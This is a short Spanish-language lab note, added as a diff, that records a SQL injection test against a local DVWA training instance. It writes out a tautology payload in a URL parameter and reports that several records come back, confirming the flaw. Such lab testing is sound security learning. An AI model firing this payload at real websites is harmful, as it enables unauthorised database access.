@@ -1,0 +1,5 @@
+Prueba realizada:
+http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
+
+Resultado:
+Se muestran múltiples registros, indicando vulnerabilidad SQL Injection.
